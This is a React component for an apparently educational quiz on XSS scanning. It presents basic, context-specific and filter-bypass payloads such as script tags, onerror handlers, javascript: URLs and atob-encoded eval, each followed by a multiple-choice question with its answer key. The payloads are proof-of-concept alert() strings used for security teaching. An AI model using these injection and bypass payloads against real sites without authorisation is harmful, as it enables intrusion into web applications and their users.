import { useState } from "react";
import "./styles.scss";

export default function XSSScanningTask({ onComplete }) {
  const [currentStep, setCurrentStep] = useState(0);
  const [completedSteps, setCompletedSteps] = useState([]);
  const [answers, setAnswers] = useState({});

  const steps = [
    {
      id: "basic-payloads",
      title: "Basic XSS Payloads",
      description: "Test the application with simple XSS payloads",
      task: (
        <div className="task-box">
          <h4>Testing Basic XSS Payloads</h4>
          <p className="task-intro">
            Start with simple payloads to detect XSS vulnerabilities
          </p>

          <div className="payload-demo">
            <h5>Common Test Payloads:</h5>
            <div className="payload-list">
              <div className="payload-item">
                <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
                <span className="payload-desc">Classic XSS test</span>
              </div>
              <div className="payload-item">
                <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
                <span className="payload-desc">Image tag with event handler</span>
              </div>
              <div className="payload-item">
                <code>&lt;svg onload=alert('XSS')&gt;</code>
                <span className="payload-desc">SVG-based XSS</span>
              </div>
              <div className="payload-item">
                <code>&lt;body onload=alert('XSS')&gt;</code>
                <span className="payload-desc">Body event handler</span>
              </div>
            </div>
          </div>

          <div className="info-box">
            <h5>What to observe:</h5>
            <ul>
              <li>Does alert() dialog appear?</li>
              <li>Is the script tag rendered in HTML?</li>
              <li>Are special characters (&lt;, &gt;, ") encoded?</li>
              <li>Does input get reflected exactly as entered?</li>
            </ul>
          </div>
        </div>
      ),
      question: "What is the primary goal of testing basic XSS payloads?",
      options: [
        "To crash the website",
        "To detect if the application properly sanitizes/encodes user input",
        "To steal passwords immediately",
        "To delete the database",
      ],
      correct: 1,
      explanation:
        "Basic payloads help identify if the application is vulnerable to XSS by checking whether user input is properly encoded/sanitized before being reflected back.",
    },
    {
      id: "context-payloads",
      title: "Context-Specific Payloads",
      description: "Test payloads tailored to different injection contexts",
      task: (
        <div className="task-box">
          <h4>Context-Based XSS Testing</h4>
          
          <div className="context-payloads">
            <div className="payload-card">
              <h5>HTML Context</h5>
              <p>Breaking out of HTML tags:</p>
              <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>
              <code>&lt;img src=x onerror=alert(1)&gt;</code>
            </div>

            <div className="payload-card">
              <h5>Attribute Context</h5>
              <p>Breaking out of attributes:</p>
              <code>" onmouseover="alert(1)</code>
              <code>' autofocus onfocus='alert(1)</code>
            </div>

            <div className="payload-card">
              <h5>JavaScript Context</h5>
              <p>Breaking out of JavaScript strings:</p>
              <code>'-alert(1)-'</code>
              <code>"; alert(1); //</code>
            </div>

            <div className="payload-card">
              <h5>URL Context</h5>
              <p>JavaScript protocol handlers:</p>
              <code>javascript:alert(1)</code>
              <code>data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</code>
            </div>
          </div>

          <div className="tip-box">
            <p>
              <strong>Pro Tip:</strong> Always adapt your payload to match the 
              context where your input is reflected!
            </p>
          </div>
        </div>
      ),
      question: "Why do we need context-specific payloads?",
      options: [
        "To make testing more complicated",
        "Different contexts require different techniques to break out and execute code",
        "One payload works for all contexts",
        "Context doesn't matter in XSS",
      ],
      correct: 1,
      explanation:
        "Each injection context (HTML, attribute, JavaScript, URL) has different escaping rules and requires specific payloads to successfully inject and execute JavaScript code.",
    },
    {
      id: "filter-bypass",
      title: "Filter Bypass Techniques",
      description: "Test techniques to bypass XSS filters and WAFs",
      task: (
        <div className="task-box">
          <h4>Bypassing XSS Filters</h4>

          <div className="bypass-techniques">
            <div className="technique-card">
              <h5>Case Variation</h5>
              <code>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</code>
              <p>Mix uppercase and lowercase</p>
            </div>

            <div className="technique-card">
              <h5>Encoding</h5>
              <code>&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code>
              <p>Character encoding techniques</p>
            </div>

            <div className="technique-card">
              <h5>NULL Bytes</h5>
              <code>&lt;script%00&gt;alert(1)&lt;/script&gt;</code>
              <p>Inject null bytes to bypass filters</p>
            </div>

            <div className="technique-card">
              <h5>Event Handlers</h5>
              <code>&lt;img src=x onerror=eval(atob('YWxlcnQoMSk='))&gt;</code>
              <p>Use less common event handlers</p>
            </div>

            <div className="technique-card">
              <h5>Alternative Tags</h5>
              <code>&lt;svg/onload=alert(1)&gt;</code>
              <code>&lt;marquee onstart=alert(1)&gt;</code>
              <p>Use tags other than &lt;script&gt;</p>
            </div>
          </div>

          <div className="success-box">
            <p>
              <strong>Remember:</strong> Modern applications often have filters. 
              Testing bypass techniques is essential!
            </p>
          </div>
        </div>
      ),
      question: "Why test filter bypass techniques?",
      options: [
        "To make the test harder",
        "Many applications have XSS filters that need to be circumvented",
        "Bypass techniques never work",
        "Filters can't be bypassed",
      ],
      correct: 1,
      explanation:
        "Many modern applications implement XSS filters or WAFs. Testing bypass techniques is crucial to assess real-world vulnerability and demonstrate the actual risk.",
    },
    {
      id: "vulnerability-confirmation",
      title: "Confirm XSS Vulnerability",
      description: "Verify that XSS vulnerability exists and is exploitable",
      task: (
        <div className="task-box">
          <h4>XSS Vulnerability Confirmation</h4>

          <div className="confirmation-steps">
            <div className="step-item completed">
              <div className="step-number">1</div>
              <div className="step-content">
                <strong>Inject basic payload</strong>
                <p>Result: alert() executed successfully</p>
                <code className="step-code">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
              </div>
            </div>

            <div className="step-item completed">
              <div className="step-number">2</div>
              <div className="step-content">
                <strong>Verify reflection</strong>
                <p>Result: Payload reflected without encoding</p>
                <code className="step-code">View source confirms script tag in HTML</code>
              </div>
            </div>

            <div className="step-item completed">
              <div className="step-number">3</div>
              <div className="step-content">
                <strong>Test persistence</strong>
                <p>Result: Stored XSS confirmed (payload persists in database)</p>
                <code className="step-code">Payload triggers on every page load</code>
              </div>
            </div>

            <div className="step-item active">
              <div className="step-number">4</div>
              <div className="step-content">
                <strong>Document findings</strong>
                <p>Ready for Exploitation phase</p>
              </div>
            </div>
          </div>

          <div className="summary-box">
            <p><strong>Vulnerability Status:</strong> ✓ CONFIRMED</p>
            <p><strong>XSS Type:</strong> Stored XSS (Persistent)</p>
            <p><strong>Vulnerable Parameter:</strong> comment field</p>
            <p><strong>Impact:</strong> High - affects all users</p>
            <p><strong>Next Step:</strong> Exploitation Phase</p>
          </div>
        </div>
      ),
      question: "What confirms a successful XSS vulnerability?",
      options: [
        "The page loads slower",
        "JavaScript payload executes in the browser (alert dialog appears)",
        "The server crashes",
        "Nothing happens",
      ],
      correct: 1,
      explanation:
        "A confirmed XSS vulnerability means your JavaScript payload successfully executes in the victim's browser context, typically demonstrated by an alert() dialog or similar proof-of-concept.",
    },
  ];

  const handleAnswer = (stepIndex, selectedOption) => {
    const step = steps[stepIndex];
    const isCorrect = selectedOption === step.correct;

    setAnswers((prev) => ({
      ...prev,
      [stepIndex]: {
        selected: selectedOption,
        correct: isCorrect,
      },
    }));

    if (isCorrect && !completedSteps.includes(stepIndex)) {
      const newCompleted = [...completedSteps, stepIndex];
      setCompletedSteps(newCompleted);

      if (newCompleted.length === steps.length) {
        onComplete?.("scanning");
      }
    }
  };

  const goNext = () => {
    if (currentStep < steps.length - 1) {
      setCurrentStep(currentStep + 1);
    }
  };

  const goPrev = () => {
    if (currentStep > 0) {
      setCurrentStep(currentStep - 1);
    }
  };

  const handleRestart = () => {
    setCurrentStep(0);
    setCompletedSteps([]);
    setAnswers({});
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const step = steps[currentStep];
  const answered = answers[currentStep];

  return (
    <div className="scanning-container">
      <div className="content-section">
        <h2 className="step-title">{step.title}</h2>
        <p className="step-description">{step.description}</p>

        {step.task}

        <div className="question-container">
          <h4 className="question-title">{step.question}</h4>

          <div className="options-container">
            {step.options.map((option, idx) => {
              const isSelected = answered?.selected === idx;
              const isCorrect = idx === step.correct;
              const showResult = answered && isSelected;

              return (
                <button
                  key={idx}
                  onClick={() => handleAnswer(currentStep, idx)}
                  disabled={answered !== undefined}
                  className={`option-button ${
                    showResult
                      ? isCorrect
                        ? "correct"
                        : "incorrect"
                      : isSelected
                      ? "selected"
                      : ""
                  }`}
                >
                  <span className="option-icon">
                    {showResult ? (isCorrect ? "✓" : "X") : "○"}
                  </span>
                  {option}
                </button>
              );
            })}
          </div>

          {answered && (
            <div
              className={`feedback-box ${
                answered.correct ? "correct" : "incorrect"
              }`}
            >
              <p className="feedback-title">
                {answered.correct ? "Correct!" : "Incorrect"}
              </p>
              <p className="feedback-explanation">{step.explanation}</p>
              {!answered.correct && (
                <div className="restart-prompt">
                  <p className="restart-text">
                    Don't worry! Learning from mistakes is part of the process.
                    You can restart this phase to try again.
                  </p>
                  <button
                    onClick={handleRestart}
                    className="restart-button"
                  >
                    Restart Phase
                  </button>
                </div>
              )}
            </div>
          )}
        </div>
      </div>

      <div className="navigation-buttons">
        <button
          onClick={goPrev}
          disabled={currentStep === 0}
          className="nav-button prev-button"
        >
          Previous
        </button>

        {completedSteps.includes(currentStep) &&
          currentStep < steps.length - 1 && (
            <button onClick={goNext} className="nav-button next-button">
              Next
            </button>
          )}

        {completedSteps.length === steps.length && (
          <button className="nav-button complete-button">
            Phase completed!
          </button>
        )}
      </div>
    </div>
  );
}
